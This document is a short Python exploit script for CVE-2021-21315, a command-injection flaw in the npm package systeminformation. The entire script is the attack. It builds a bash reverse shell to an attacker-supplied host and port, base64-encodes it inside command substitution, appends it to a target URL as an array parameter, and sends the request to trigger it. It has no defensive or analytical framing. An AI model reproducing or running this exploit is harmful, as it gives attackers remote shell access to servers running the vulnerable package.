#! /usr/bin/env python
# Exploit Author: ali <https://github.com/alikarimi999>
# Vendor Homepage: https://www.npmjs.com/package/systeminformation
# CVE-2021-21315

from argparse import ArgumentParser
from urllib.request import quote
import requests
import base64
import sys

from requests.exceptions import Timeout
    # this function convert payload to a bsee64 string and return Vulnurable URL
def payload_wrapper(lhost,lport,url):
    
    Payload = f"bash -i >& /dev/tcp/{lhost}/{lport} 0>&1"
    Payload = base64.b64encode(Payload.encode()).decode()
    Payload = quote(f"$(echo '{Payload}' | base64 -d | bash)")
    
    url = url + f'[]={Payload}'
    return url

    # Send Payload to url and Trigger the Bug
def send_payload(url):
    print("[-] Sending Payload ...")
    try:

        req = requests.get(url,timeout=3)
    except:
        #TODO: Write a better exception Handler 
        
        print("[+] Check your listener")
        sys.exit(1)


def main():
    parser = ArgumentParser(description="Exploit for CVE-2021-21315 by https://github.com/alikarimi999")
    parser.add_argument("-u", "--url", type=str, required=True,
        help='Target URL (e.g. \"http://www.example.com/api/sysinfo?id")')
    parser.add_argument("--lport", type=int, required=True,
        help="Set Local Port for reverse shell")
    parser.add_argument("--lhost", type=str, required=True,
        help="Set Local IP Address for reverse shell")

    args = parser.parse_args()

    send_payload(payload_wrapper(args.lhost,args.lport,args.url))


if __name__ == "__main__":
    main()